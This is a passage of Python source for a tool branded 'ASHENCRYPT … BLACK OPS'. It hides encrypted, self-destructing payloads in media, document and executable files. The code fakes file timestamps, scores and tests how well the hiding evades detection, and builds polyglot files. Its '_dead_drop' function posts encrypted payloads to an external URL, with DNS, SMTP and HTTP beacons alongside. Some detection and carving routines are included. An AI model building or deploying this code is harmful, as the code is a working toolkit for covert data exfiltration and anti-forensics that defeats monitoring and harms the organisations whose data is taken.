    if suf == ".wav":
        return ["wav", "eof"]
    if suf in _AUD_EXT:
        return ["mp3", "meta", "eof"]
    if suf in _VID_EXT:
        return ["mp4", "video", "meta", "eof"]
    if suf == ".pdf":
        return ["pdf", "eof"]
    if suf in _ARC_EXT:
        return ["zip", "eof"]
    if suf in _EXE_EXT:
        return ["exe", "eof"]
    return ["eof"]


@dataclass
class _Hdr:
    magic: bytes
    ver: int
    algo: int
    flags: int
    length: int
    salt: bytes
    nonce: bytes
    sha: bytes
    crc: int
    rs: int
    n: int
    pl: int
    nonce2: int
    sd_ts: int
    chacha: int

    def pack(self) -> bytes:
        return (self.magic + bytes([self.ver, self.algo, self.flags, self.chacha])
                + struct.pack(">I", self.length)
                + self.salt + self.nonce + self.sha
                + struct.pack(">I", self.crc)
                + struct.pack(">HH", self.rs, self.n)
                + struct.pack(">II", self.pl, self.nonce2)
                + struct.pack(">I", self.sd_ts)
                + b"\x00" * 4)

    @classmethod
    def unpack(cls, d: bytes) -> "_Hdr":
        if len(d) < _H:
            raise ValueError("short")
        magic = d[:4]
        ver, algo, flags, chacha = d[4:8]
        length = struct.unpack(">I", d[8:12])[0]
        salt = d[12:28]
        nonce = d[28:40]
        sha = d[40:56]
        crc = struct.unpack(">I", d[56:60])[0]
        rs, n = struct.unpack(">HH", d[60:64])
        pl, n2 = struct.unpack(">II", d[64:72])
        sd = struct.unpack(">I", d[72:76])[0]
        return cls(magic, ver, algo, flags, length, salt, nonce, sha, crc,
                   rs, n, pl, n2, sd, chacha)


def _g(p: Path) -> np.ndarray:
    return np.asarray(Image.open(p).convert("L"), dtype=np.float64)


def _psnr(a: Path, b: Path) -> float:
    try:
        mse = np.mean((_g(a) - _g(b)) ** 2)
        return float("inf") if mse == 0 else float(10 * np.log10(255 ** 2 / mse))
    except Exception:
        return 0.0


def _ssim(a: Path, b: Path) -> float:
    try:
        x, y = _g(a), _g(b)
        mx, my = x.mean(), y.mean()
        vx, vy = x.var(), y.var()
        cov = np.mean((x - mx) * (y - my))
        c1, c2 = (0.01 * 255) ** 2, (0.03 * 255) ** 2
        return float(((2 * mx * my + c1) * (2 * cov + c2)) /
                     ((mx ** 2 + my ** 2 + c1) * (vx + vy + c2)))
    except Exception:
        return 0.0


def _chi(p: Path) -> float:
    try:
        arr = np.asarray(Image.open(p).convert("L"), dtype=np.uint8).ravel()
        hist = np.bincount(arr, minlength=256).astype(np.float64)
        pairs = hist.reshape(128, 2)
        obs, exp = pairs[:, 0], pairs.mean(axis=1)
        mask = exp > 5
        if not mask.any():
            return 1.0
        chi2 = np.sum((obs[mask] - exp[mask]) ** 2 / exp[mask])
        from math import erf
        df = int(mask.sum() - 1)
        if df <= 0:
            return 1.0
        z = (chi2 - df) / np.sqrt(2 * df)
        return float(np.clip(0.5 * (1 - erf(z / np.sqrt(2))), 0, 1))
    except Exception:
        return 1.0


def _rs_an(p: Path) -> dict:
    try:
        img = np.asarray(Image.open(p).convert("L"), dtype=np.int16)
        f, g = img[:, :-1].ravel(), img[:, 1:].ravel()
        m = np.array([0, 1, 1, 0], dtype=np.int16)
        total = irr = 0
        for i in range(0, len(f) - 4, 4):
            bf, bg = f[i:i + 4], g[i:i + 4]
            df = int(np.sum(np.abs(bf - np.roll(bf, 1)) * m))
            dg = int(np.sum(np.abs(bg - np.roll(bg, 1)) * m))
            total += 1
            if (df % 2) < (dg % 2):
                irr += 1
        ratio = irr / total if total else 0
        return {"sample_pairs": total, "irregular_ratio": round(ratio, 4),
                "estimated_lsb_rate": round(abs(ratio - 0.25) * 2, 4)}
    except Exception:
        return {"sample_pairs": 0, "irregular_ratio": 0, "estimated_lsb_rate": 0}


def _spa(p: Path) -> dict:
    try:
        img = np.asarray(Image.open(p).convert("L"), dtype=np.int16)
        f, g = img[:, :-1].ravel(), img[:, 1:].ravel()
        x = np.where(f % 2 == 0, f // 2, (f + 1) // 2)
        y = np.where(g % 2 == 0, g // 2, (g + 1) // 2)
        n = len(x)
        if n == 0:
            return {"spa_estimate": 0.0, "pairs": 0}
        x_bar = x + (f - 2 * x)
        y_bar = y + (g - 2 * y)
        d = np.mean(np.abs(x - y) - np.abs(x_bar - y_bar))
        return {"spa_estimate": round(float(np.clip(abs(d) * 2, 0, 1)), 4),
                "pairs": int(n)}
    except Exception:
        return {"spa_estimate": 0.0, "pairs": 0}


def _ent(p: Path) -> dict:
    try:
        arr = np.asarray(Image.open(p).convert("RGB"), dtype=np.uint8)
        lsb = (arr & 1).ravel()
        p1 = lsb.mean()
        p0 = 1 - p1
        h = -p1 * np.log2(p1 + 1e-12) - p0 * np.log2(p0 + 1e-12)
        return {"lsb_bit_entropy": round(float(h), 4),
                "lsb_bias": round(float(abs(p1 - 0.5)), 5)}
    except Exception:
        return {"lsb_bit_entropy": 0, "lsb_bias": 0}


def analyse(original: Optional[Path], stego: Path) -> dict:
    p = _chi(stego)
    r = {"file": str(stego), "size_bytes": stego.stat().st_size,
         "chi_square_pvalue": round(p, 5),
         "rs_analysis": _rs_an(stego),
         "spa_analysis": _spa(stego),
         "entropy": _ent(stego)}
    if original and original.exists():
        r["psnr_db"] = round(_psnr(original, stego), 2)
        r["ssim"] = round(_ssim(original, stego), 5)
    risk = 0.0
    risk += max(0, 1 - p / 0.05) * 30
    risk += min(1, r["rs_analysis"]["estimated_lsb_rate"]) * 20
    risk += r["spa_analysis"]["spa_estimate"] * 20
    if r["entropy"]["lsb_bit_entropy"] > 0.98:
        risk += min(20, (r["entropy"]["lsb_bit_entropy"] - 0.98) / 0.02 * 20)
    r["forensic_risk_score"] = round(min(100, max(0, risk)), 1)
    r["verdict"] = ("SAFE" if risk < 25 else
                    "CAUTION" if risk < 60 else "LIKELY-DETECTABLE")
    return r


def _tex(p: Path) -> float:
    try:
        g = _g(p)
        gx = np.abs(np.diff(g, axis=1, prepend=g[:, :1]))
        gy = np.abs(np.diff(g, axis=0, prepend=g[:1, :]))
        return float((gx + gy).mean())
    except Exception:
        return 0.0


def _rank(paths: List[Path], needed: int, aname: str) -> List[dict]:
    algo = _A[aname]
    out = []
    for p in paths:
        try:
            cap = algo.capacity_bytes(p)
            t = _tex(p) if p.suffix.lower() in _IMG_EXT else 1.0
            fits = cap >= needed
            score = t * (cap / max(needed, 1)) ** 0.3
            out.append({"path": str(p), "capacity_bytes": cap, "fits": fits,
                        "texture": round(t, 2), "score": round(score, 3)})
        except Exception as e:
            out.append({"path": str(p), "error": str(e), "fits": False,
                        "score": -1})
    out.sort(key=lambda r: (not r["fits"], -r["score"]))
    return out


@dataclass
class _Rep:
    algorithm: str
    carrier_type: str
    payload_bytes: int
    compressed_bytes: int
    encrypted: bool
    rs_enabled: bool
    total_bytes: int
    capacity_bytes: int
    utilisation: float
    n_parts: int = 1
    duration_ms: float = 0.0
    outputs: List[str] = field(default_factory=list)


class _Eng:
    def __init__(self, password: Optional[str] = None, use_rs: bool = False,
                 adversarial: bool = False, decoy: bool = False,
                 channel: Optional[bytes] = None,
                 self_destruct_after: Optional[int] = None,
                 nest_layers: int = 0, honey: bool = False):
        self.password = password
        self.use_rs = use_rs
        self.adversarial = adversarial
        self.decoy = decoy
        self.channel = channel
        self.sd_after = self_destruct_after
        self.nest = nest_layers
        self.honey = honey
        self.rs = _RS(16) if use_rs else None

    def _prep(self, raw: bytes, comp: bool, multi: bool):
        flags = _F_MI if multi else 0
        body = raw
        if self.nest > 0:
            for _ in range(self.nest):
                body = zlib.compress(body, 9)
                body = _xor_stream(body, secrets.token_bytes(16))
                body = hashlib.sha256(body + secrets.token_bytes(8)).digest()[:16] + body
            flags |= _F_NEST
        if self.adversarial:
            body = body + os.urandom(secrets.randbelow(2048) + 256)
            flags |= _F_ADV
        if self.honey:
            body = b"\x00" * 1024 + body
            flags |= _F_HNY
        if comp:
            body = zlib.compress(body, 9)
            flags |= _F_CMP
        if self.use_rs:
            body = self.rs.encode(body)
            flags |= _F_RS
        chacha = 0
        if self.password:
            ct, salt, nonce, chacha = _enc(body, self.password)
            flags |= _F_ENC
        else:
            ct = body
            salt = secrets.token_bytes(_S)
            nonce = secrets.token_bytes(_N)
        if self.decoy:
            ct = ct + os.urandom(secrets.randbelow(1024))
            flags |= _F_DEC
        if self.channel:
            ct = _xor_stream(ct, self.channel)
            flags |= _F_CHN
        sd = 0
        if self.sd_after:
            sd = int(time.time()) + self.sd_after
            flags |= _F_SD
        return ct, flags, salt, nonce, sd, chacha

    def embed(self, carrier_path, payload_path, out_path,
              algorithm=None, compress=True) -> _Rep:
        t0 = time.perf_counter()
        cp = Path(carrier_path)
        if algorithm is None:
            algorithm = _auto_algo_for(cp)[0]
        algo = _A[algorithm]
        raw = Path(payload_path).read_bytes()
        ct, flags, salt, nonce, sd, chacha = self._prep(raw, compress, False)
        hdr = _Hdr(_poly_magic(), 15, algo.algo_id, flags, len(ct),
                   salt, nonce, hashlib.sha256(raw).digest()[:16],
                   zlib.crc32(ct) & 0xFFFFFFFF,
                   self.rs.parity if self.rs else 0, 1, len(raw),
                   _poly_int(), sd, chacha)
        combined = hdr.pack() + ct
        cap = algo.capacity_bytes(cp)
        if len(combined) > cap:
            raise ValueError(f"overflow {len(combined)}>{cap}")
        Path(out_path).parent.mkdir(parents=True, exist_ok=True)
        algo.embed(cp, combined, Path(out_path))
        try:
            os.utime(out_path, (time.time() - secrets.randbelow(86400),
                                time.time() - secrets.randbelow(86400)))
        except Exception:
            pass
        return _Rep(algorithm, cp.suffix.lower().lstrip("."),
                    len(raw), len(ct), self.password is not None,
                    self.use_rs, len(combined), cap,
                    round(len(combined) / cap, 4), 1,
                    (time.perf_counter() - t0) * 1000, [str(out_path)])

    def extract(self, stego_path, out_path) -> bytes:
        sp = Path(stego_path)
        hdr = algo = None
        for name in _auto_algo_for(sp) + list(_A.keys()):
            alg = _A[name]
            try:
                raw = alg.extract(sp, _H)
                try:
                    hdr_try = _Hdr.unpack(raw)
                    if hdr_try.ver == 15:
                        hdr = hdr_try
                        algo = alg
                        break
                except Exception:
                    pass
            except Exception:
                continue
        if hdr is None:
            raise ValueError("no header")
        if hdr.flags & _F_SD and hdr.sd_ts > 0 and time.time() > hdr.sd_ts:
            raise ValueError("self-destructed")
        body = algo.extract(sp, _H + hdr.length)[_H:]
        if hdr.flags & _F_CHN:
            if not self.channel:
                raise ValueError("channel key required")
            body = _xor_stream(body, self.channel)
        if (zlib.crc32(body) & 0xFFFFFFFF) != hdr.crc:
            raise ValueError("crc mismatch")
        if hdr.flags & _F_ENC:
            if not self.password:
                raise ValueError("password required")
            body = _dec(body, hdr.salt, hdr.nonce, self.password, hdr.chacha)
        if hdr.flags & _F_RS:
            body = _RS(hdr.rs).decode(body)
        if hdr.flags & _F_CMP:
            body = zlib.decompress(body)
        if hdr.flags & _F_HNY:
            body = body[1024:]
        if hdr.flags & _F_ADV:
            body = body[:hdr.pl]
        if hdr.flags & _F_NEST:
            for _ in range(self.nest):
                body = body[16:]
                body = zlib.decompress(bytes(body))
        if hashlib.sha256(body).digest()[:16] != hdr.sha:
            raise ValueError("integrity failure")
        Path(out_path).write_bytes(body)
        return body

    def auto_embed(self, payload_path: Path, cover_dir: Path,
                   out_dir: Path) -> _Rep:
        t0 = time.perf_counter()
        raw = payload_path.read_bytes()
        est = len(zlib.compress(raw, 9)) + _H + (64 if self.use_rs else 0)
        if self.nest:
            est *= (self.nest + 1)
        covers = [p for p in cover_dir.iterdir() if p.is_file()
                  and not p.name.startswith(".")]
        if not covers:
            raise ValueError("no covers")
        for cover in sorted(covers, key=lambda p: -p.stat().st_size):
            for aname in _auto_algo_for(cover):
                try:
                    if _A[aname].capacity_bytes(cover) < est:
                        continue
                    out_dir.mkdir(parents=True, exist_ok=True)
                    out = out_dir / (payload_path.stem +
                                     f"_ash_{aname}{cover.suffix}")
                    rep = self.embed(cover, payload_path, out,
                                     algorithm=aname, compress=True)
                    rec = out_dir / (payload_path.stem + "_v.tmp")
                    self.extract(out, rec)
                    if rec.read_bytes() != raw:
                        raise RuntimeError("verify failed")
                    rec.unlink()
                    rep.duration_ms = (time.perf_counter() - t0) * 1000
                    return rep
                except Exception:
                    continue
        raise ValueError("no cover fits")


def _batch(eng: _Eng, inputs: List[Path], cover_dir: Path,
           out_dir: Path, workers: int = 4) -> List[dict]:
    out_dir.mkdir(parents=True, exist_ok=True)
    results = []

    def _run(payload: Path) -> dict:
        try:
            rep = eng.auto_embed(payload, cover_dir, out_dir)
            return {"input": str(payload), "status": "ok", "report": asdict(rep)}
        except Exception as e:
            return {"input": str(payload), "status": "error", "error": str(e)}

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_run, p): p for p in inputs}
        for f in tqdm(as_completed(futures), total=len(futures), desc="batch"):
            results.append(f.result())
    return results


def _hunt(target: Path, deep: bool = False) -> dict:
    res = {"file": str(target), "size": target.stat().st_size,
           "sha256": hashlib.sha256(target.read_bytes()).hexdigest(),
           "detections": [], "type": target.suffix.lower()}
    try:
        img = Image.open(target)
        res["dimensions"] = f"{img.size[0]}x{img.size[1]}"
        res["format"] = img.format
        res["metadata"] = dict(img.info)
    except Exception:
        pass
    for name, alg in _A.items():
        try:
            head = alg.extract(target, _H)
            try:
                hdr = _Hdr.unpack(head)
            except Exception:
                continue
            if hdr.ver != 15:
                continue
            res["detections"].append({
                "algorithm": name,
                "payload_bytes": hdr.pl,
                "encrypted": bool(hdr.flags & _F_ENC),
                "rs": bool(hdr.flags & _F_RS),
                "compressed": bool(hdr.flags & _F_CMP),
                "adversarial": bool(hdr.flags & _F_ADV),
                "channel": bool(hdr.flags & _F_CHN),
                "nested": bool(hdr.flags & _F_NEST),
                "honey": bool(hdr.flags & _F_HNY),
                "self_destruct": bool(hdr.flags & _F_SD),
                "sd_ts": hdr.sd_ts,
                "chacha": bool(hdr.chacha),
                "magic": hdr.magic.hex(),
            })
        except Exception:
            pass
    if deep and target.suffix.lower() in _IMG_EXT:
        res["chi"] = round(_chi(target), 5)
        res["rs"] = _rs_an(target)
        res["spa"] = _spa(target)
        res["entropy"] = _ent(target)
    res["status"] = "DETECTED" if res["detections"] else "CLEAN"
    return res


def _carve(target: Path, out_dir: Path) -> List[str]:
    out_dir.mkdir(parents=True, exist_ok=True)
    found = []
    for name, alg in _A.items():
        try:
            head = alg.extract(target, _H)
            hdr = _Hdr.unpack(head)
            if hdr.ver != 15:
                continue
            body = alg.extract(target, _H + hdr.length)[_H:]
            p = out_dir / f"carved_{name}_{hdr.pl}.bin"
            p.write_bytes(body)
            found.append(str(p))
        except Exception:
            pass
    return found


def _poison(src: Path, out: Path, mode: str = "shuffle") -> dict:
    if src.suffix.lower() not in _IMG_EXT:
        shutil.copy(str(src), str(out))
        with open(out, "ab") as fh:
            fh.write(os.urandom(2048))
        return {"input": str(src), "output": str(out), "mode": "append-noise"}
    img = Image.open(src).convert("RGB")
    arr = np.asarray(img, dtype=np.uint8).copy()
    if mode == "shuffle":
        flat = arr.reshape(-1, 3)
        idx = np.random.default_rng().permutation(len(flat))
        arr = flat[idx].reshape(arr.shape)
    elif mode == "invert_lsb":
        arr = arr ^ 1
    elif mode == "noise":
        arr = np.clip(arr.astype(np.int16) +
                      np.random.default_rng().integers(-3, 4, arr.shape),
                      0, 255).astype(np.uint8)
    elif mode == "recompress":
        buf = io.BytesIO()
        Image.fromarray(arr).save(buf, "JPEG", quality=75)
        buf.seek(0)
        arr = np.asarray(Image.open(buf).convert("RGB"))
    elif mode == "blur":
        arr = np.asarray(Image.fromarray(arr).filter(ImageFilter.GaussianBlur(0.8)))
    Image.fromarray(arr).save(out, "PNG")
    _scrub_meta(out)
    return {"input": str(src), "output": str(out), "mode": mode}


def _make_honey(n: int, out_dir: Path) -> List[str]:
    out_dir.mkdir(parents=True, exist_ok=True)
    outs = []
    for i in range(n):
        arr = np.random.default_rng(secrets.randbits(64)).integers(
            0, 256, (512, 512, 3), dtype=np.uint8)
        bits = _b2b(os.urandom(1024))
        flat = arr.reshape(-1)
        flat[:bits.size] = (flat[:bits.size] & 0xFE) | bits
        arr = flat.reshape(512, 512, 3)
        out = out_dir / f"honey_{i}_{secrets.token_hex(4)}.png"
        Image.fromarray(arr).save(out, "PNG")
        _scrub_meta(out)
        outs.append(str(out))
    return outs


def _evade_test(carrier: Path, payload: Path, algorithm: Optional[str] = None) -> dict:
    tmp = Path(tempfile.mkdtemp())
    try:
        eng = _Eng(password="x")
        s = tmp / ("s" + carrier.suffix)
        eng.embed(carrier, payload, s, algorithm=algorithm)
        base = analyse(carrier if carrier.suffix.lower() in _IMG_EXT else None, s)
        tests = {}
        for attack in ("jpeg95", "jpeg85", "jpeg70", "blur", "noise", "resize"):
            try:
                if carrier.suffix.lower() not in _IMG_EXT:
                    tests[attack] = "n/a"
                    continue
                buf = io.BytesIO()
                img = Image.open(s)
                if attack.startswith("jpeg"):
                    q = int(attack[4:])
                    img.save(buf, "JPEG", quality=q)
                    buf.seek(0)
                    out = tmp / f"a_{attack}.png"
                    Image.open(buf).convert("RGB").save(out, "PNG")
                elif attack == "blur":
                    out = tmp / f"a_{attack}.png"
                    img.filter(ImageFilter.GaussianBlur(0.5)).save(out, "PNG")
                elif attack == "noise":
                    a = np.asarray(img, dtype=np.int16)
                    a = np.clip(a + np.random.default_rng().integers(-3, 4, a.shape),
                                0, 255).astype(np.uint8)
                    out = tmp / f"a_{attack}.png"
                    Image.fromarray(a).save(out, "PNG")
                elif attack == "resize":
                    w, h = img.size
                    out = tmp / f"a_{attack}.png"
                    img.resize((w // 2, h // 2)).resize((w, h)).save(out, "PNG")
                rec = tmp / "r.bin"
                try:
                    eng.extract(out, rec)
                    ok = rec.read_bytes() == payload.read_bytes()
                except Exception:
                    ok = False
                tests[attack] = "survived" if ok else "destroyed"
            except Exception as e:
                tests[attack] = f"error: {e}"
        return {"algorithm": algorithm or "auto",
                "carrier_type": carrier.suffix.lower(),
                "baseline": base, "attacks": tests}
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def _chain_encode(path: Path, layers: int = 3) -> bytes:
    body = path.read_bytes()
    for _ in range(layers):
        body = zlib.compress(body, 9)
        body = base64.b64encode(body)
        body = bytes(b ^ 0xA5 for b in body)
    return body


def _chain_decode(body: bytes, layers: int = 3) -> bytes:
    for _ in range(layers):
        body = bytes(b ^ 0xA5 for b in body)
        body = base64.b64decode(body)
        body = zlib.decompress(body)
    return body


def _dead_drop(payload: Path, target_url: str, key: str) -> dict:
    try:
        data = payload.read_bytes()
        enc, s, n, _ = _enc(data, key)
        body = json.dumps({
            "sid": secrets.token_hex(8),
            "salt": base64.b64encode(s).decode(),
            "nonce": base64.b64encode(n).decode(),
            "ct": base64.b64encode(enc).decode(),
        }).encode()
        req = urllib.request.Request(target_url, data=body,
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            return {"status": resp.status, "size": len(body)}
    except Exception as e:
        return {"error": str(e)}


def _dns_beacon(domain: str, secret: str) -> dict:
    try:
        token = hmac.new(secret.encode(), str(time.time()).encode(),
                        hashlib.sha256).hexdigest()[:32]
        host = f"{token}.{domain}"
        try:
            ip = socket.gethostbyname(host)
            return {"resolved": ip, "token": token}
        except socket.gaierror:
            return {"status": "no-resolve", "token": token}
    except Exception as e:
        return {"error": str(e)}


def _smtp_beacon(host: str, port: int, user: str, pw: str,
                 to: str, subject: str, body: str) -> dict:
    try:
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = user
        msg["To"] = to
        with smtplib.SMTP(host, port, timeout=15) as s:
            s.starttls()
            s.login(user, pw)
            s.send_message(msg)
        return {"status": "sent"}
    except Exception as e:
        return {"error": str(e)}


def _http_beacon(stego: Path, url: str, secret: str) -> dict:
    try:
        h = hmac.new(secret.encode(), stego.read_bytes(), hashlib.sha256).hexdigest()
        body = json.dumps({"sig": h, "size": stego.stat().st_size,
                          "ts": int(time.time())}).encode()
        req = urllib.request.Request(url, data=body,
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            return {"status": resp.status, "sig": h[:16]}
    except Exception as e:
        return {"error": str(e)}


def _sd_watch(stego: Path, password: str) -> dict:
    try:
        for _, alg in _A.items():
            try:
                raw = alg.extract(stego, _H)
                hdr = _Hdr.unpack(raw)
                if hdr.ver != 15:
                    continue
                if hdr.flags & _F_SD and hdr.sd_ts > 0:
                    remain = hdr.sd_ts - int(time.time())
                    return {"self_destruct": True,
                            "expires_ts": hdr.sd_ts,
                            "seconds_remaining": remain,
                            "expired": remain <= 0}
                return {"self_destruct": False}
            except Exception:
                continue
        return {"error": "no header"}
    except Exception as e:
        return {"error": str(e)}


def _make_polyglot(carrier: Path, payload: Path, out: Path,
                   prepend: Optional[Path] = None) -> dict:
    eng = _Eng(password="poly")
    tmp = Path(tempfile.mkdtemp())
    try:
        img = Image.open(carrier).convert("RGB")
        img.save(tmp / "c.png", "PNG")
        s = tmp / "inner.png"
        eng.embed(tmp / "c.png", payload, s, "adaptive")
        data = s.read_bytes()
        prefix = prepend.read_bytes() if prepend else b"GIF89a"
        out.write_bytes(prefix + data)
        return {"output": str(out), "size": out.stat().st_size,
                "prefix_len": len(prefix)}
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def _self_test() -> int:
    _ban("Self-Test")
    fails = 0
    with tempfile.TemporaryDirectory() as td:
        td = Path(td)
        img = td / "c.png"
        Image.fromarray(np.random.default_rng(1).integers(0, 256, (512, 512, 3),
                        dtype=np.uint8)).save(img)
        wav_p = td / "c.wav"
        rate = 44100
        samples = np.random.default_rng(2).integers(-8000, 8000, rate).astype(np.int16)
        with wave.open(str(wav_p), "wb") as w:
            w.setnchannels(1)
            w.setsampwidth(2)
            w.setframerate(rate)
            w.writeframes(samples.tobytes())
        secret = td / "s.bin"
        secret.write_bytes(os.urandom(8000))
        for name in ["adaptive", "wav", "eof", "dct", "lsb"]:
            try:
                e = _Eng(password="test")
                carrier = wav_p if name == "wav" else img
                out = td / f"s_{name}{carrier.suffix}"
                e.embed(carrier, secret, out, algorithm=name)
                rec = td / f"r_{name}.bin"
                _Eng(password="test").extract(out, rec)
                ok = rec.read_bytes() == secret.read_bytes()
                print(f"  {'ok' if ok else 'fail'} {name}")
                if not ok:
                    fails += 1
            except Exception as ex:
                print(f"  fail {name}: {ex}")
                fails += 1
        try:
            e = _Eng(password="test", adversarial=True, decoy=True,
                     channel=b"chankey", nest_layers=2, honey=True,
                     self_destruct_after=3600)
            out = td / "adv.png"
            e.embed(img, secret, out, "adaptive")
            _Eng(password="test", channel=b"chankey",
                 nest_layers=2).extract(out, td / "x.bin")
            ok = (td / "x.bin").read_bytes() == secret.read_bytes()
            print(f"  {'ok' if ok else 'fail'} full-stack")
        except Exception as ex:
            print(f"  fail full-stack: {ex}")
            fails += 1
        try:
            honeys = _make_honey(3, td / "honey")
            print(f"  ok honey ({len(honeys)} files)")
        except Exception as ex:
            print(f"  fail honey: {ex}")
            fails += 1
        try:
            v = _Vault(td / "v.kf", "m")
            v.init()
            v.add("t", "pw")
            assert v.get("t") == "pw"
            print("  ok vault")
        except Exception as ex:
            print(f"  fail vault: {ex}")
            fails += 1
        try:
            poly = _make_polyglot(img, secret, td / "poly.png")
            print(f"  ok polyglot ({poly['size']} B)")
        except Exception as ex:
            print(f"  fail polyglot: {ex}")
            fails += 1
        try:
            chained = _chain_encode(secret, 3)
            back = _chain_decode(chained, 3)
            ok = back == secret.read_bytes()
            print(f"  {'ok' if ok else 'fail'} chain")
            if not ok:
                fails += 1
        except Exception as ex:
            print(f"  fail chain: {ex}")
            fails += 1
    print("\nALL PASSED" if fails == 0 else f"{fails} FAILED")
    return 0 if fails == 0 else 1


_NEON = "\x1b[93;1m"
_C = {"c": "\x1b[36m", "g": "\x1b[32m", "r": "\x1b[31m",
      "y": "\x1b[33m", "d": "\x1b[2m", "x": "\x1b[0m", "b": "\x1b[1m",
      "m": "\x1b[35m", "n": _NEON}


def _show_banner():
    print(f"{_NEON}{_BANNER}{_C['x']}")
    print(f"{_NEON}                        A S H E N C R Y P T{_C['x']}")
    print(f"{_C['d']}              by SYLHETYHACKVENGER (THE-ERROR808)"
          f"  \u2014  BLACK OPS{_C['x']}\n")


def _ban(t):
    ln = "\u2550" * 70
    print(f"{_NEON}{ln}{_C['x']}")
    print(f"  {_NEON}{_C['b']}ASHENCRYPT{_C['x']} {_C['d']}|{_C['x']} "
          f"{_NEON}BLACK OPS \u2014 {t}{_C['x']}")
    print(f"{_NEON}{ln}{_C['x']}")


def _rep_out(r: _Rep) -> None:
    print(f"  algorithm  : {r.algorithm.upper()}  ({r.carrier_type})")
    print(f"  payload    : {r.payload_bytes:,} B")
    print(f"  encrypted  : {'AES/ChaCha (auto)' if r.encrypted else 'no'}")
    print(f"  rs         : {'on' if r.rs_enabled else 'off'}")
    print(f"  used       : {r.utilisation * 100:.2f}%")
    print(f"  elapsed    : {r.duration_ms:.0f} ms")
    if r.n_parts > 1:
        print(f"  parts      : {r.n_parts}")
        for o in r.outputs:
            print(f"    {o}")
    else:
        for o in r.outputs:
            print(f"  output     : {o}")


def _pw(args) -> Optional[str]:
    if getattr(args, "keyfile", None):
        return _Vault(Path(args.keyfile), args.vault_pw or "").get(args.key)
    return getattr(args, "password", None)


def _eng_from(args) -> _Eng:
    channel = args.channel.encode() if getattr(args, "channel", None) else None
    return _Eng(_pw(args), getattr(args, "rs", False),
                getattr(args, "adversarial", False),
                getattr(args, "decoy", False), channel,
                getattr(args, "self_destruct", None),
                getattr(args, "nest", 0),
                getattr(args, "honey", False))


def _c_auto_hide(args) -> int:
    _ban("Auto Hide")
    try:
        r = _eng_from(args).auto_embed(Path(args.payload), Path(args.covers),
                                       Path(args.out or "./ash_out"))
    except Exception as e:
        print(f"{_C['r']}{e}{_C['x']}")
        return 1
    _rep_out(r)
    return 0


def _c_auto_extract(args) -> int:
    _ban("Auto Extract")
    try:
        d = _eng_from(args).extract(Path(args.stego), Path(args.output))
    except Exception as e:
        print(f"{_C['r']}{e}{_C['x']}")
        return 1
    print(f"{_C['g']}{len(d):,} B \u2192 {args.output}{_C['x']}")
    return 0


def _c_batch(args) -> int:
    _ban("Batch")
    inputs = [p for p in Path(args.input).iterdir()
              if p.is_file() and not p.name.startswith(".")]
    if not inputs:
        print(f"{_C['r']}no files{_C['x']}")
        return 1
    res = _batch(_eng_from(args), inputs, Path(args.covers),
                 Path(args.out or "./ash_batch"), args.workers)
    ok = sum(1 for r in res if r["status"] == "ok")
    print(f"\n  {ok}/{len(res)} succeeded")
    if args.report:
        Path(args.report).write_text(json.dumps(res, indent=2, default=str))
        print(f"  report \u2192 {args.report}")
    return 0


def _c_hunt(args) -> int:
    _ban("Hunter")
    r = _hunt(Path(args.target), deep=args.deep)
    for k, v in r.items():
        if k == "detections":
            print(f"  detections : {len(v)}")
            for d in v:
                print(f"    [{d['algorithm']}] pl={d['payload_bytes']:,} "
                      f"enc={d['encrypted']} rs={d['rs']} "
                      f"nest={d['nested']} honey={d['honey']} "
                      f"chacha={d['chacha']}")
        elif isinstance(v, dict):
            print(f"  {k}:")
            for sk, sv in v.items():
                print(f"    {sk:<18}: {sv}")
        else:
            print(f"  {k:<22}: {v}")
    return 0


def _c_carve(args) -> int:
    _ban("Carver")
    found = _carve(Path(args.target), Path(args.out or "./carved"))
    if not found:
        print(f"  {_C['y']}nothing to carve{_C['x']}")
        return 0
    for f in found:
        print(f"  {_C['g']}{f}{_C['x']}")
    return 0


def _c_poison(args) -> int:
    _ban(f"Poison \u2014 {args.mode}")
    r = _poison(Path(args.input), Path(args.output), args.mode)
    print(f"  {r['input']} \u2192 {r['output']}  ({r['mode']})")
    return 0


def _c_honey(args) -> int:
    _ban("Honey Trap Generator")
    outs = _make_honey(args.count, Path(args.out or "./honey"))
    for o in outs:
        print(f"  {_C['g']}{o}{_C['x']}")
    return 0


def _c_evade(args) -> int:
    _ban("Evasion Test")
    r = _evade_test(Path(args.carrier), Path(args.payload), args.algorithm)
    print(f"  carrier    : {r['carrier_type']}")
    print(f"  algorithm  : {r['algorithm']}")
    if isinstance(r['baseline'], dict) and 'forensic_risk_score' in r['baseline']:
        print(f"  baseline   : risk={r['baseline']['forensic_risk_score']} "
              f"verdict={r['baseline']['verdict']}")
    for k, v in r["attacks"].items():
        col = _C["g"] if v == "survived" else (
            _C["y"] if v == "n/a" else _C["r"])
        print(f"    {k:<10} {col}{v}{_C['x']}")
    return 0


def _c_polyglot(args) -> int:
    _ban("Polyglot")
    prepend = Path(args.prepend) if args.prepend else None
    r = _make_polyglot(Path(args.carrier), Path(args.payload),
                       Path(args.output), prepend)
    print(f"  output     : {r['output']}")
    print(f"  size       : {r['size']:,} B")
    print(f"  prefix_len : {r['prefix_len']:,} B")
    return 0


def _c_chain(args) -> int:
    _ban(f"Chain \u2014 {args.mode}")
    if args.mode == "encode":
        data = _chain_encode(Path(args.input), args.layers)
        Path(args.output).write_bytes(data)
        print(f"  {len(data):,} B \u2192 {args.output}")
    else:
        data = _chain_decode(Path(args.input).read_bytes(), args.layers)
        Path(args.output).write_bytes(data)
        print(f"  {len(data):,} B \u2192 {args.output}")
    return 0


def _c_dead_drop(args) -> int:
    _ban("Dead Drop")
    r = _dead_drop(Path(args.payload), args.url, args.key)
    for k, v in r.items():
        print(f"  {k:<12}: {v}")
    return 0


def _c_dns_beacon(args) -> int:
    _ban("DNS Beacon")
    r = _dns_beacon(args.domain, args.secret)
    for k, v in r.items():
        print(f"  {k:<12}: {v}")
    return 0


def _c_smtp_beacon(args) -> int:
    _ban("SMTP Beacon")
    r = _smtp_beacon(args.host, args.port, args.user, args.pw,
                     args.to, args.subject, args.body)
    for k, v in r.items():
        print(f"  {k:<12}: {v}")
    return 0


def _c_http_beacon(args) -> int:
